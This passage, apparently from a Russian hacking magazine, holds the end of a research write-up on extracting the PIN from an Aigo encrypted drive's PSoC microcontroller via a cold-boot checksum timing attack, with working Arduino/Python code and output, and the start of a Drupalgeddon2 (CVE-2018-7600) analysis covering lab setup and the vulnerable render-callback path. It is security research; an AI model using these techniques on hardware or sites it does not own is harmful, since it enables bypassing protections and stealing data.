дование, где автор, хотя и не погружается в детали, дает нес колько дельных
подсказок: «Каждая инструкция начинается с трех бит, которые соответству ют
одной из четырех мнемоник (прочитать из RAM, записать в RAM, прочитать
регистр, записать регистр). Затем идет восемь бит адре са, после чего
восемь бит данных (считанные или для записи) и, наконец, три стоп‐бита».
  Затем мне удалось почерпнуть очень полезную информацию из раздела
«Supervisory ROM (SROM)» техничес кого руководства. SROM — это жес тко
закодированная ROM в PSoC, которая предос тавляет сервисные функции (по
тому же принципу, что и Syscall), — для программного кода, запущенного
в пользовательском пространстве:
 • 00h : SWBootReset
 • 01h : ReadBlock
 • 02h : WriteBlock
 • 03h : EraseBlock
 • 06h : TableRead
 • 07h : CheckSum
 • 08h : Calibrate0
 • 09h : Calibrate1

Сравнивая име на векторов с функциями SROM, мы можем сопоставить опе‐
рации, поддерживаемые этим протоколом, с ожидаемыми SROM‐парамет‐
рами. Благодаря это му можем декодировать первые три бита ISSP‐векторов:
 • 100 => wrmem
 • 101 => rdmem
 • 110 => wrreg
 • 111 => rdreg

Однако полное понима ние внутричипо вых процессов можно получить только
при непосредственном общении с PSoC.


Об щение с PSoC
Поскольку Дирк Петраутский уже портировал Cypress’овский HSSP‐код на Ar‐
duino, я воспользовался Arduino Uno для подклю чения к ISSP‐разъему кла‐
виатурной платы.
  Обрати внимание, что в ходе сво их исследова ний я довольно сильно
изменил код Дирка. Мою модификацию можно най ти на GitHub: здесь, соот‐
ветствующий Python‐скрипт для общения с Arduino — в моем репозитории
cypress_psoc_tools.
   Итак, применяя Arduino, я сначала использовал для «обще ния» только
«официальные» век торы. Я попытался прочитать внут реннюю ROM, используя
команду VERIFY. Как и ожидалось, этого мне сделать не удалось. Вероятно,
из‐за того, что внутри флешки активированы биты защиты от считывания.
  Затем я создал несколько сво их прос теньких векторов для записи и чте‐
ния памяти/регистров. Обрати внимание, что мы можем читать всю SROM,
даже несмотря на то, что флешка защищена!


Иден тификация внутричипо вых регистров
Посмотрев на «дизассемблированные» векторы, я обнаружил, что девайс
использует недокументированные регистры (0xF8–0xFA) для указания M8C‐
опкодов, которые выполняются напрямую, в обход защиты. Это позволило
мне запускать различные опкоды, такие как «ADD», «MOV A, X», «PUSH»
или «JMP». Благодаря им (глядя на побочные эффекты, оказываемые ими
на регистры) я смог определить, какие из недокументированных регистров
фактически являются обычными регистра ми (A, X, SP и PC).
  В итоге «дизассемблированный» код, сгенери рованный инс трументом
HSSP_disas.rb, выглядит так (для ясности я добавил комментарии):


‐‐== init2 ==‐‐
[DE E0 1C] wrreg CPU_F (f7), 0x00   # Сброс флагов
[DE C0 1C] wrreg SP (f6), 0x00      # Сброс SP
[9F 07 5C] wrmem KEY1, 0x3A     # Обязательный аргумент для SSC
[9F 20 7C] wrmem KEY2, 0x03     # Аналогично
[DE A0 1C] wrreg PCh (f5), 0x00     # Сброс PC (MSB) ...
[DE 80 7C] wrreg PCl (f4), 0x03     # (LSB) ... до 3 ??
[9F 70 1C] wrmem POINTER, 0x80      # RAM‐указатель для выходных
данных
[DF 26 1C] wrreg opc1 (f9), 0x30        # Опкод 1 => "HALT"
[DF 48 1C] wrreg opc2 (fa), 0x40        # Опкод 2 => "NOP"
[9F 40 3C] wrmem BLOCKID, 0x01  # BLOCK ID для вызова SSC
[DE 00 DC] wrreg A (f0), 0x06       # Номер "Syscall" : TableRead
[DF 00 1C] wrreg opc0 (f8), 0x00        # Опкод для SSC, "Superv
isory SROM Call"
[DF E2 5C] wrreg CPU_SCR0 (ff), 0x12    # Недокументированная
операция: выполнить внешний опкод


Защитные биты
На данном этапе я уже могу общаться с PSoC, но у меня все еще нет дос‐
товерной информации о защитных битах флешки. Я был очень удивлен, что
Cypress не дает поль зователю девайса никаких средств для того, чтобы про‐
верить, активирована ли защита. Я углубился в Google, чтобы окончательно
понять, что HSSP‐код, предоставленный Cypress’ом, был обновлен уже после
того, как Дирк выпустил свою модификацию. В результате появил ся вот такой
новый вектор:


[DE E0 1C] wrreg CPU_F (f7), 0x00
[DE C0 1C] wrreg SP (f6), 0x00
[9F 07 5C] wrmem KEY1, 0x3A
[9F 20 7C] wrmem KEY2, 0x03
[9F A0 1C] wrmem 0xFD, 0x00 # Неизвестные аргументы
[9F E0 1C] wrmem 0xFF, 0x00 # Аналогично
[DE A0 1C] wrreg PCh (f5), 0x00
[DE 80 7C] wrreg PCl (f4), 0x03
[9F 70 1C] wrmem POINTER, 0x80
[DF 26 1C] wrreg opc1 (f9), 0x30
[DF 48 1C] wrreg opc2 (fa), 0x40
[DE 02 1C] wrreg A (f0), 0x10   # Недокументированный syscall!
[DF 00 1C] wrreg opc0 (f8), 0x00
[DF E2 5C] wrreg CPU_SCR0 (ff), 0x12

Используя этот вектор (см. read_security_data в psoc.py), мы получаем все
защитные биты в SRAM в 0x80, где на каждый защищаемый блок приходится
по два бита.
  Результат удручает: все защищено в режиме «отключить внешние чте ние
и запись». Поэтому мы не только считывать с флешки ничего не можем, но и
записывать тоже (чтобы, например, внедрить туда ROM‐дампер). А единс‐
твенный способ отключить защиту — полностью стереть весь чип. :(


ПЕРВАЯ (НЕУДАВШАЯСЯ) АТАКА: ROMX
Однако мы можем попробовать сделать следующий трюк: пос кольку у нас
есть возможность выполнять произволь ные опкоды, почему бы не выполнить
ROMX, который применяется для чтения флеш‐памяти? У такого подхода есть
неплохие шансы на успех. Потому что функция ReadBlock, счи тывающая дан‐
ные из SROM (которая используется векторами), проверя ет, вызывается ли
она из ISSP. Однако опкод ROMX, предположительно, может не иметь такой
проверки. Итак, вот Python‐код (после добавления нескольких вспомогатель‐
ных классов в сишный Arduino‐код):


for i in range(0, 8192):
    write_reg(0xF0, i>>8)       # A = 0
    write_reg(0xF3, i&0xFF)     # X = 0
    exec_opcodes("\x28\x30\x40")    # ROMX, HALT, NOP
    byte = read_reg(0xF0)       # ROMX reads ROM[A|X] into A
    print "%02x" % ord(byte[0]) # print ROM byte

К сожалению, этот код не работа ет. :( Вернее, работает, но мы на выходе
получаем свои собственные опко ды (0x28 0x30 0x40)! Не думаю, что соот‐
ветствующая функциональ ность девайса служит элементом защиты от чтения.
Это больше похоже на инженерный трюк: при выполнении внешних опкодов
ROM’овская шина перенаправляется на временный буфер.


ВТОРАЯ АТАКА: ТРАССИРОВКА С ХОЛОДНОЙ ПЕРЕЗАГРУЗКОЙ
Поскольку трюк с ROMX не сра ботал, я стал обду мывать другую вариацию
этого трюка — описанную в пуб ликации Shedding too much Light on a Micro‐
controller’s Firmware Protection.


Ре ализация
В документации на ISSP приведен следующий вектор для CHECKSUM‐SETUP:


[DE E0 1C] wrreg CPU_F (f7), 0x00
[DE C0 1C] wrreg SP (f6), 0x00
[9F 07 5C] wrmem KEY1, 0x3A
[9F 20 7C] wrmem KEY2, 0x03
[DE A0 1C] wrreg PCh (f5), 0x00
[DE 80 7C] wrreg PCl (f4), 0x03
[9F 70 1C] wrmem POINTER, 0x80
[DF 26 1C] wrreg opc1 (f9), 0x30
[DF 48 1C] wrreg opc2 (fa), 0x40
[9F 40 1C] wrmem BLOCKID, 0x00
[DE 00 FC] wrreg A (f0), 0x07
[DF 00 1C] wrreg opc0 (f8), 0x00
[DF E2 5C] wrreg CPU_SCR0 (ff), 0x12

Здесь производится вызов SROM‐функции 0x07, как представлено в докумен‐
тации (ширный шрифт мой):



      Это функция провер ки контрольной сум мы. Она вычис ляет 16-битовую
      контрольную  сум му  количес тва  блоков,  заданных  пользовате лем,
      в одном флеш‑банке, отсчитывая с нуля. Параметр BLOCKID исполь-
       зуется для переда чи количес тва блоков, которое будет использовать-
      ся при рас чете контрольной сум мы. Зна чение 1 будет вычис лять кон-
      трольную сум му только для нулевого блока, тогда как 0 приведет
     к  тому,  что будет вычислена общая контрольная сумма
     всех 256 блоков флеш‐банка. 16‐битовая контрольная сумма
     возвращается через KEY1 и KEY2. В параметре KEY1 фик сиру ются
     млад шие 8 бит контрольной сум мы, а в KEY2 — стар шие 8 бит.
      Для девайсов с нес колькими флеш‑банками функция контрольной
      сум мы  вызыва ется  для  каждого  по  отдельнос ти.  Номер  банка,
      с которым она будет работать, зада ется регис тром FLS_PR1 (путем
       уста нов ки в нем бита, соответс тву юще го целевому флеш‑банку).

Обрати внимание, что это простейшая контроль ная сумма: байты прос то сум‐
мируются один за другим; никаких изощренных CRC‐причуд. Кроме того,
зная, что в ядре M8C набор регистров очень невелик, я предположил, что
при вычислении контрольной суммы про межу точные значения будут фик‐
сироваться в тех же самых переменных, которые в итоге пой дут на выход:
KEY1 (0xF8) / KEY2 (0xF9).
   Итак, в теории моя ата ка выглядит так:
 1. Соединяемся через ISSP.
 2. Запускаем вычисление контрольной суммы с использованием вектора
  CHECKSUM‐SETUP.
 3. Перезагружаем процес сор через заданное время T.
 4. Считываем RAM, чтобы получить текущую контроль ную сумму C.
 5. Повторяем шаги 3 и 4, каждый раз немного увеличивая T.
 6. Восстанавливаем данные из флешки, вычитая предыду щую контрольную
   сумму C из текущей.

Однако возникла проб лема: вектор Initialize‐1, который мы должны отправить
после перезагрузки, переза писывает KEY1 и KEY2:


1100101000000000000000  # Магия, переводящая PSoC в режим
программирования
nop
nop
nop
nop
nop
[DE E0 1C] wrreg CPU_F (f7), 0x00
[DE C0 1C] wrreg SP (f6), 0x00
[9F 07 5C] wrmem KEY1, 0x3A # Контрольная сумма перезаписывается
здесь
[9F 20 7C] wrmem KEY2, 0x03 # и здесь
[DE A0 1C] wrreg PCh (f5), 0x00
[DE 80 7C] wrreg PCl (f4), 0x03
[9F 70 1C] wrmem POINTER, 0x80
[DF 26 1C] wrreg opc1 (f9), 0x30
[DF 48 1C] wrreg opc2 (fa), 0x40
[DE 01 3C] wrreg A (f0), 0x09   # SROM‐функция 9
[DF 00 1C] wrreg opc0 (f8), 0x00    # SSC
[DF E2 5C] wrreg CPU_SCR0 (ff), 0x12

Этот код затирает нашу дра гоценную контрольную сумму, вызывая Calibrate1
(SROM‐функция 9)… Может быть, нам удастся, просто отправив магичес кое
число (из начала приведенного выше кода), войти в режим программирова‐
ния и затем считать SRAM? И да, это работа ет! Arduino‐код, реализующий эту
атаку, довольно прост:


case Cmnd_STK_START_CSUM:
    checksum_delay = ((uint32_t)getch())<<24;
    checksum_delay |= ((uint32_t)getch())<<16;
    checksum_delay |= ((uint32_t)getch())<<8;
    checksum_delay |= getch();
    if(checksum_delay > 10000) {
        ms_delay = checksum_delay/1000;
        checksum_delay = checksum_delay%1000;
    }
    else {
        ms_delay = 0;
    }
    send_checksum_v();
    if(checksum_delay)
        delayMicroseconds(checksum_delay);
    delay(ms_delay);
    start_pmode();

 1. Считать checkum_delay.
 2. Запустить вычисление контрольной суммы (send_checksum_v).
 3. Подождать заданный про межу ток времени, учитывая следующие под‐
   водные камни:

    • я убил уйму времени, пока не узнал, что, ока зывается, delayMicrosec‐
     onds работает корректно толь ко с задержками, не превышающи‐
     ми 16 383 мкс;
    • и затем снова убил столько же времени, пока не обнаружил, что de‐
      layMicroseconds, если ей на вход передать 0, работает совершенно
     неправильно!

 4. Перезагрузить PSoC в режим программирова ния (просто отправляем
   магическое число, без отправки инициализиру ющих векторов).

Итоговый код на Python:


for delay in range(0, 150000):  # Задержка в микросекундах
    for i in range(0, 10):      # Количество считывания для каждой
из задержек
        try:
            reset_psoc(quiet=True)  # Перезагрузка и вход в режим
программирования
            send_vectors()      # Отправка инициализирующих векторов
            ser.write("\x85"+struct.pack(">I", delay)) # Вычислить
контрольную сумму + перезагрузиться после задержки
            res = ser.read(1)       # Считать Arduino ACK
        except Exception as e:
            print e
            ser.close()
            os.system("timeout ‐s KILL 1s picocom ‐b 115200 /dev/
ttyACM0 2>&1 > /dev/null")
            ser = serial.Serial('/dev/ttyACM0', 115200, timeout=0.5)
# Открыть последовательный порт
            continue
        print "%05d %02X %02X %02X" % (delay,      # Считать
RAM‐байты
                read_regb(0xf1),
                read_ramb(0xf8),
                read_ramb(0xf9))

В двух словах, что делает этот код:
 1. Перезагружает PSoC (и отправляет ему магичес кое число).
 2. Отправляет пол ноценные векторы инициализации.
 3. Вызывает Arduino‐функцию Cmnd_STK_START_CSUM (0x85), куда в качес‐
   тве параметра переда ется задержка в микросекундах.
 4. Считывает контроль ную сумму (0xF8 и 0xF9) и недокументированный
   регистр 0xF1.

Этот код выполняется по десять раз за одну микросекунду. 0xF1 сюда вклю‐
чен, поскольку был единственным регистром, который менял ся при вычис‐
лении контрольной суммы. Возможно, это какая‐то временная переменная,
используемая  арифметико‐логичес ким  устрой ством.  Обрати  внимание
на уродливый хак, которым я перезагружаю Arduino, используя picocom, когда
Arduino перестает подавать признаки жизни (понятия не имею почему).


Считываем результат
Результат работы Python‐скрипта выглядит так (упрощен для удобочитаемос‐
ти):


DELAY F1 F8 F9  # F1 — упомянутый неизвестный регистр
                  # F8 — младший байт контрольной суммы
                  # F9 — старший байт контрольной суммы
00000 03 E1 19
[...]
00016 F9 00 03
00016 F9 00 00
00016 F9 00 03
00016 F9 00 03
00016 F9 00 03
00016 F9 00 00  # Контрольная сумма сбрасывается в 0
00017 FB 00 00
[...]
00023 F8 00 00
00024 80 80 00  # 1‐й байт: 0x0080‐0x0000 = 0x80
00024 80 80 00
00024 80 80 00
[...]
00057 CC E7 00   # 2‐й байт: 0xE7‐0x80: 0x67
00057 CC E7 00
00057 01 17 01  # Понятия не имею, что здесь происходит
00057 01 17 01
00057 01 17 01
00058 D0 17 01
00058 D0 17 01
00058 D0 17 01
00058 D0 17 01
00058 F8 E7 00  # Снова E7?
00058 D0 17 01
[...]
00059 E7 E7 00
00060 17 17 00  # Хм‐м‐м
[...]
00062 00 17 00
00062 00 17 00
00063 01 17 01  # А, дошло! Вот же он, перенос в старший байт
00063 01 17 01
[...]
00075 CC 17 01  # Итак, 0x117‐0xE7: 0x30

При этом у нас есть проб лема: пос кольку мы опериру ем фактической кон‐
трольной суммой, нулевой байт не меняет счи танное значение. Однако, пос‐
кольку вся процедура вычисления (8192 байт) занимает 0,1478 с (с неболь‐
шими  отклонениями при каждом  запуске),  что при мерно  соответству‐
ет 18,04 мкс на байт, мы можем использовать это время для проверки зна‐
чения контрольной суммы в подходящие моменты. Для первых прогонов все
считывается  доволь но‐таки  лег ко,  пос кольку  длительность  выполнения
вычислительной процедуры всегда практически оди наковая. Однако конец
этого дампа менее точен, потому что «нез начитель ные отклонения по вре‐
мени» при каждом прогоне суммиру ются и ста новятся значительными:


134023 D0 02 DD
134023 CC D2 DC
134023 CC D2 DC
134023 CC D2 DC
134023 FB D2 DC
134023 3F D2 DC
134023 CC D2 DC
134024 02 02 DC
134024 CC D2 DC
134024 F9 02 DC
134024 03 02 DD
134024 21 02 DD
134024 02 D2 DC
134024 02 02 DC
134024 02 02 DC
134024 F8 D2 DC
134024 F8 D2 DC
134025 CC D2 DC
134025 EF D2 DC
134025 21 02 DD
134025 F8 D2 DC
134025 21 02 DD
134025 CC D2 DC
134025 04 D2 DC
134025 FB D2 DC
134025 CC D2 DC
134025 FB 02 DD
134026 03 02 DD
134026 21 02 DD

Это десять дам пов для каждой микросекундной задержки. Общее вре мя
работы для снятия дампа всех 8192 байт флешки сос тавля ет поряд ка 48 ч.

Ре конструк ция флеш‑бинарника
Я пока еще не завершил код, который полностью реконструирует програм‐
мный код флешки с учетом всех отклонений по времени. Однако начало этого
кода я уже восстановил. Что бы убедиться в том, что сделал это корректно, я
дизассемблировал его при помощи m8cdis:


0000: 80 67   jmp  0068h     ; Reset vector
[...]
0068: 71 10   or  F,010h
006a: 62 e3 87 mov  reg[VLT_CR],087h
006d: 70 ef   and  F,0efh
006f: 41 fe fb and  reg[CPU_SCR1],0fbh
0072: 50 80   mov  A,080h
0074: 4e    swap A,SP
0075: 55 fa 01 mov  [0fah],001h
0078: 4f    mov  X,SP
0079: 5b    mov  A,X
007a: 01 03   add  A,003h
007c: 53 f9   mov  [0f9h],A
007e: 55 f8 3a mov  [0f8h],03ah
0081: 50 06   mov  A,006h
0083: 00    ssc
[...]
0122: 18    pop  A
0123: 71 10   or  F,010h
0125: 43 e3 10 or  reg[VLT_CR],010h
0128: 70 00   and  F,000h ; Paging mode changed from 3 to 0
012a: ef 62   jacc 008dh
012c: e0 00   jacc 012dh
012e: 71 10   or  F,010h
0130: 62 e0 02 mov  reg[OSC_CR0],002h
0133: 70 ef   and  F,0efh
0135: 62 e2 00 mov  reg[INT_VC],000h
0138: 7c 19 30 lcall 1930h
013b: 8f ff   jmp  013bh
013d: 50 08   mov  A,008h
013f: 7f    ret

Выглядит вполне правдоподобно!

Находим адрес хранения ПИН‑кода
Теперь, когда мы можем считывать контрольную сумму в нужные нам момен‐
ты времени, мы можем легко проверить, как и где она меняется, когда мы:
 • вводим неверный ПИН‐код;
 • измененяем ПИН‐код.

Вначале, чтобы найти приблизительный адрес хранения, я снял дамп кон‐
трольной суммы с шагом в 10 мс, пос ле перезаг рузки. Затем я ввел неверный
ПИН‐код и сделал то же самое.
  Результат оказался не очень приятным, пос коль ку изменений было много.
Но в конце концов мне удалось установить, что контрольная сумма изме‐
нилась где‐то в промежутке между 120 000 мкс и 140 000 мкс задержки.
Но «ПИН‐код», который я там обнаружил, был абсолютно неправильный —
из‐за артефакта процеду ры delayMicroseconds, которая делает непонятные
вещи, когда ей передается 0.
  Затем, потратив почти три часа, я вспомнил, что SROM’овский сис темный
вызов CheckSum на входе получа ет аргумент, зада ющий количес тво блоков
для контрольной суммы! Таким обра зом, мы можем без труда локализовать
адрес хранения ПИН‐кода и счетчика «неверных попыток» с точностью до 64‐
байтового блока.
  Мои первоначальные прогоны дали следующий результат:





Затем я поменял ПИН‐код с 123456 на 1234567 и получил:





Таким образом, ПИН‐код и счетчик неверных попыток, похоже, хранятся
в блоке 126.


Снимаем дамп бло ка 126
Блок 126 должен располагаться где‐то в районе 125 x 64 x 18 = 144 000 мкс
от начала расчета контрольной суммы в моем полном дампе, и он выглядит
вполне прав доподобно. Затем, пос ле ручного отсеивания многочисленных
неверных дампов (из‐за накопления «нез начитель ных отклонений по вре‐
мени»), я в итоге получил вот такие байты (на задержке 145 527 мкс):





Совершенно очевидно, что ПИН‐код хранится в незашифрованном виде! Эти
значения, конечно, записа ны не в ASCII‐кодах, но, как оказалось, отражают
показания, снятые с емкостной клавиатуры.
  Наконец, я провел еще несколько тес тов, чтобы найти, где хранится счет‐
чик неверных попыток. Вот результат:





0xFF означает «15 попыток», и он умень шает ся при каждой неверной попытке.

Восстановление ПИН‑кода
Вот мой уродливый код, который собирает вместе все сказанное выше:


def dump_pin():
  pin_map = {0x24: "0", 0x25: "1", 0x26: "2", 0x27:"3", 0x20: "4",
0x21: "5",
        0x22: "6", 0x23: "7", 0x2c: "8", 0x2d: "9"}
  last_csum = 0
  pin_bytes = []
  for delay in range(145495, 145719, 16):
    csum = csum_at(delay, 1)
    byte = (csum‐last_csum)&0xFF
    print "%05d %04x (%04x) => %02x" % (delay, csum, last_csum, byte)
    pin_bytes.append(byte)
    last_csum = csum
  print "PIN: ",
  for i in range(0, len(pin_bytes)):
    if pin_bytes[i] in pin_map:
      print pin_map[pin_bytes[i]],
  print

Вот результат его выполнения:


$ ./psoc.py
syncing: KO OK
Resetting PSoC: KO Resetting PSoC: KO Resetting PSoC: OK
145495 53e2 (0000) => e2
145511 5407 (53e2) => 25
145527 542d (5407) => 26
145543 5454 (542d) => 27
145559 5474 (5454) => 20
145575 5495 (5474) => 21
145591 54b7 (5495) => 22
145607 54da (54b7) => 23
145623 5506 (54da) => 2c
145639 5506 (5506) => 00
145655 5533 (5506) => 2d
145671 554c (5533) => 19
145687 554e (554c) => 02
145703 554e (554e) => 00
PIN: 1 2 3 4 5 6 7 8 9

Ура! Работает!
  Важный момент: значения задержки, использованные мной, скорее всего,
актуальны для одного кон кретного PSoC — того, которым пользовался я.


ЧТО ДАЛЬШЕ?
Итак, подведем итоги на стороне PSoC, в контексте нашего накопи теля Aigo:
 • мы можем считывать SRAM, даже если она защищена от считывания;
 • мы можем обой ти защиту от считыва ния посредс твом атаки «трассировка
   с холодной перезагрузкой» и непосредственного считывания ПИН‐кода.

Тем не менее у нашей ата ки есть некоторые недоработки — из‐за проблем
с синхронизацией. Ее можно было бы улучшить следующим образом:
 • написать  утилиту для правиль ного декоди рова ния выходных данных,
   которые получены в результате ата ки «трас сировка с холодной перезаг‐
   рузкой»;
 • использовать FPGA‐примочку для создания более точных вре менных
   задержек (или использовать аппаратные таймеры Arduino);
 • попробовать еще одну  ата ку: ввести заведо мо неверный ПИН‐код,
   перезагрузить и сдампить RAM, надеясь на то, что правильный ПИН‐код
   окажется сох раненным в RAM, для сравнения. Однако на Arduino это сде‐
   лать не так‐то просто, поскольку уровень сигнала Arduino составля ет 5 В,
   в то время как исследуемая нами плата работает с сигналами в 3,3 В.

Одна интересная вещь, которую можно было бы попробовать, — поиграть
уровнем напряжения для обхода защиты от чтения. Если бы такой под ход
сработал, мы бы смог ли получать абсолютно точные данные с флешки —
вместо того, чтобы полагать ся на чтение контрольной суммы с неточными
временными задержками.
  Поскольку SROM, вероятно, считывает защитные биты посредством сис‐
темного вызова ReadBlock, мы могли бы сделать то же самое, что описано
в блоге Дмитрия Недоспасова, — повторную реализацию атаки Криса Гер‐
лински, анонсированной на конференции REcon Brussels 2017.
  Еще одна забавная вещь, которую можно было бы сделать, — сточить
с микросхемы корпус: для снятия дампа SRAM, выявления недоку мен‐
тированных системных вызовов и уяз вимос тей.


ЗАКЛЮЧЕНИЕ
Итак, защита этого накопителя оставляет желать лучшего, потому что для хра‐
нения ПИН‐кода он использует обычный (не «закаленный») микроконтрол‐
лер… Плюс я еще не смотрел (пока), как на этом девайсе обстоят дела
с шифрованием данных!
   Что можно посоветовать для Aigo? Проанализировав пару‐тройку моделей
зашифрованных HDD‐накопителей, я в 2015 году сделал пре зентацию
на SyScan, в которой рас смот рел проблемы безопасности нескольких внеш‐
них HDD‐накопителей и дал рекомендации, что в них можно было бы улуч‐
шить. :‐)
  На это исследование я пот ратил два выходных и нес колько вечеров.
В общей сложности порядка сорока часов. Считая с самого начала (когда я
вскрыл диск) и до конца (дамп ПИН‐кода). В эти же сорок часов включено
время, которое я потратил, чтобы написать эту статью. Очень увле кательное
было путешествие.
ВЗЛОМ
ДРУПАЛГЕДДОН2





              ПОДРОБНО РАЗБИРАЕМ
               НОВУЮ УЯЗВИМОСТЬ
        aLLy       ONsec                     В DRUPAL
     @iamsecurity




Вот и настал час второго «Друпалгеддо на»! Это новая вер‐
сия наделав шей в свое время много шума критической уяз‐
вимости в одной из самых популярных CMS. Найденная
брешь позволяет абсолютно любому незарегистрирован‐
ному пользователю всего одним зап росом выполнять любые
команды на целевой системе.


Проблему обостряет то, что под угрозой ока зались все наиболее акту альные
версии приложения веток 7.х и 8.х, вплоть до 8.5.0. Сложно даже предста‐
вить, сколько потенциально уязвимых целей доступно в данный момент зло‐
умышленникам.


             INFO

                       Уязвимость получила идентификатор CVE‐2018‐
                     7600 и высочайший статус опасности.


Разработчики выпустили патч еще 28 марта 2018 года, однако до 12 апре ля
в паблике не наблюдалось ссылок на работающий PoC или деталей проб‐
лемы. Стоит отдать разработчикам должное за патч, который был очень
лаконичным и не давал прямого ответа на воп рос, в каком месте стоит искать
проблему.
   Теперь, когда маски сброшены, давай пос мотрим на уязвимость и сам
эксплоит во всей красе.


ВОСПРОИЗВОДИМ УЯЗВИМУЮ СИСТЕМУ
Протестировать уязвимость несложно. Само приложение очень просто уста‐
навливается, а кроме того, у Drupal имеется офи циальный репози торий
на Docker Hub, и развернуть контейнер с нуж ной версией CMS можно бук‐
вально в пару команд.
   Развернем сначала копию MySQL, хотя можно и без него, Drupal под‐
держивает работу с SQLite.


$ docker run ‐d ‐e MYSQL_USER="drupal" ‐e MYSQL_PASSWORD="Q0b6EF
CVW4" ‐e MYSQL_DATABASE="drupal" ‐‐rm ‐‐name=mysql ‐‐hostname=mysql
mysql/mysql‐server

Теперь сам контейнер с CMS. Я решил использовать пос леднюю уяз вимую
версию — 8.5.0.


$ docker run ‐d ‐‐rm ‐p80:80 ‐p9000:9000 ‐‐link=mysql
‐‐name=drupalvh ‐‐hostname=drupalvh drupal:8.5.0

Дальше открываем в браузере адрес твоего докера и переходим к установке.





                        Ус тановка Drupal 8.5.0

Откидываемся на спин ку кресла и ждем завершения инстал ляции.





                  Процесс уста новки Drupal 8.5.0

Наслаждаемся готовым к исследованию приложением. Если хочешь возиться
с отладкой, как я, то можно установить Xdebug. Делается это тоже буквально
парой команд.


$ pecl install xdebug
$ echo "zend_extension=/usr/local/lib/php/extensions/
no‐debug‐non‐zts‐20170718/xdebug.so" > /usr/local/etc/php/conf.d/
php‐xdebug.ini
$ echo "xdebug.remote_enable=1" >> /usr/local/etc/php/conf.d/
php‐xdebug.ini
$ echo "xdebug.remote_host=192.168.99.1" >> /usr/local/etc/php/conf.
d/php‐xdebug.ini

Не забудь поменять IP‐адрес 192.168.99.1 на свой. Дальше перезагружаем
конфиги Apache.


$ service apache2 reload

В качестве отладчика я использую JetBrains PhpStorm.


ДЕТАЛИ
Для начала обратимся к пат чу, который исправляет уязвимость.





            Коммит с пат чем уязвимости Drupalgeddon 2

Здорово, не правда ли? Раз работчики прос то добавили фильтрацию всех
отправляемых юзером данных.
  И все же кое‐какой свет на уязвимость это исправление может пролить.
Посмотрим на сам код про цеду ры, которая отвечает за проверку. Данные
передаются в метод sanitize, который вызыва ет stripDangerousValues.


/core/lib/Drupal/Core/DrupalKernel.php
545:   public function preHandle(Request $request) {
546:     // Sanitize the request.
547:     $request = RequestSanitizer::sanitize(
548:       $request,
549:       (array) Settings::get(RequestSanitizer::SANITIZE_WHITELIST
, []),


/core/lib/Drupal/Core/Security/RequestSanitizer.php
40:   public static function sanitize(Request $request, $whitelist, $
log_sanitized_keys = FALSE) {
...
44:       $request‐>query‐>replace(static::stripDangerousValues($
request‐>query‐>all(), $whitelist, $get_sanitized_keys));

А этот метод, в свою очередь, уже выполняет проверку всех переданных
параметров. Если в них присутству ют пустые, начинающиеся с символа
решетки или отсутствующие в списке разрешенных, то они отбрасываются.


/core/lib/Drupal/Core/Security/RequestSanitizer.php
84:   protected static function stripDangerousValues($input, array $
whitelist, array &$sanitized_keys) {
85:     if (is_array($input)) {
86:       foreach ($input as $key => $value) {
87:         if ($key !== '' && $key[0] === '#' && !in_array($key, $
whitelist, TRUE)) {
88:           unset($input[$key]);
89:           $sanitized_keys[] = $key;
90:         }
91:         else {
92:           $input[$key] = static::stripDangerousValues($input[$key
], $whitelist, $sanitized_keys);
93:         }
94:       }
95:     }
96:     return $input;
97:   }

Что же это за волшебные параметры, которые начинаются с решетки? А это,
мой друг, специальные плейсхолдеры для Drupal Render API. Этот API был
введен с седьмой версии CMS и использует ся для превращения структуриро‐
ванных данных в готовый HTML.
  Данные, нужные при соз дании запрашива емой страницы и отдельных ее
частей, хранятся в виде осо бых мас сивов до этапа рендеринга. Это предос‐
тавляет широкие возможнос ти для изменения разметки или самого содер‐
жания страницы в любой момент на этапе заг рузки или после него.
  В Render API присутству ет такое понятие, как рендерные массивы (Render‐
able Arrays). Это массивы с осо бой структурой, в которых хранится информа‐
ция и то, каким образом данные нужно представить (отрендерить) для поль‐
зователя. Ключи с символом # — это как раз атрибуты для интерпретатора,
который выполняет конвертацию.
  Существует некото рое количес тво предоп ределенных типов этих атри‐
бутов, например page, form, html_tag, value, markup и тому подобные.
Большинство из них опи саны в официальной документации по Forms API.
  В контексте нашей уяз вимости интерес ны атри буты, которые при обработ‐
ке вызывают call_user_func. Нап ример, к таким относятся #pre_render,
#post_render, #access_callback, #submit, #lazy_builder, #validate.
Для демонстрации экспло ита я воспользуюсь #post_render. Обработка это‐
го элемента описана в файле Renderer.php.


/core/lib/Drupal/Core/Render/Renderer.php
500:     if (isset($elements['#post_render'])) {
501:       foreach ($elements['#post_render'] as $callable) {
502:         if (is_string($callable) && strpos($callable, '::') ===
FALSE) {
503:           $callable = $this‐>controllerResolver‐>getControllerFr
omDefinition($callable);
504:         }
505:         $elements['#children'] = call_user_func($callable, $
elements['#children'], $elements);
506:       }
507:     }

Теперь нам нужно найти такое мес то, где пользовательские данные попадают
в функцию render, чтобы внедрить этот атрибут с нужными параметрами.
Причем сосредоточиться стоит на тех мес тах, которые доступны неавторизо‐
ванному пользователю, так как извес тно, что для эксплуатации никаких прав
не нужно.


/core/lib/Drupal/Core/Render/Renderer.php
182:   public function render(&$elements, $is_root_call = FALSE) {
...
194:     try {
195:       return $this‐>doRender($elements, $is_root_call);
...
207:   protected function doRender(&$elements, $is_root_call = FALSE)
 {

Drupal огромен, и поиск таких мест может занять продолжительное время,
поэтому не буду тебя мучить (к тому же ребята из Check Point уже сде лали
всю работу за нас). Во время регистра ции нового пользовате ля есть воз‐
можность сразу же загрузить ава тар.





        Форма регистра ции нового пользователя в Drupal 8.5.0

Давай загрузим какую‐нибудь картинку, предваритель но пус тив трафик через
прокси.





               Запрос на заг рузку аватара пользователя

За обработку это го запроса отвечает метод uploadAjaxCallback класса
ManagedFile.


/core/modules/file/src/Element/ManagedFile.php
172:   public static function uploadAjaxCallback(&$form, FormSt
ateInterface &$form_state, Request $request) {

Обрати внимание на параметр element_parents в запросе.


element_parents=user_picture/widget/0

Он используется для дальнейшей обработки.


/core/modules/file/src/Element/ManagedFile.php
174:     $renderer = \Drupal::service('renderer');
175:
176:     $form_parents = explode('/', $request‐>query‐>get('elemen
t_parents'));

Переданные данные разбиваются по слешу и используются при получении
данных из основной формы с помощью NestedArray::getValue.


/core/modules/file/src/Element/ManagedFile.php
179:     $form = NestedArray::getValue($form, $form_parents);


/core/lib/Drupal/Component/Utility/NestedArray.php
69:   public static function &getValue(array &$array, array $parents,
 &$key_exists = NULL) {
70:     $ref = &$array;
